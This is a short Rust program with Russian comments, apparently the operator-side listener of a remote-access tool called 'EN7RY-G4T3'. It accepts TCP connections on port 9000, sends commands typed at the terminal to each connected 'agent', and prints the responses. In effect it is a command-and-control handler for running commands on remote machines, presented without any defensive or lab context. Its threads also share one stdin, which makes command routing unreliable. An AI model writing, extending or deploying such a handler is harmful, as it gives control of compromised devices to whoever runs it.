use std::net::{TcpListener};
use std::io::{Read, Write};
use std::thread;

fn main() {
    let listener = TcpListener::bind("0.0.0.0:9000").expect("Cannot bind TCP port");
    println!("EN7RY-G4T3 Server listening on TCP port 9000");

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("Device connected: {}", stream.peer_addr().unwrap());

                // Поток для общения с этим клиентом
                thread::spawn(move || {
                    let mut buf = [0u8; 1024];
                    loop {
                        // Ввод команды с терминала
                        let mut input = String::new();
                        std::io::stdin().read_line(&mut input).expect("Failed to read input");

                        if input.trim().is_empty() {
                            continue;
                        }

                        // Отправка команды агенту
                        stream.write_all(input.as_bytes()).expect("Failed to send command");

                        // Получение ответа
                        let bytes_read = stream.read(&mut buf).expect("Failed to read response");
                        let response = String::from_utf8_lossy(&buf[..bytes_read]);
                        println!("Response: {}", response);
                    }
                });
            }
            Err(e) => println!("Connection failed: {}", e),
        }
    }
}
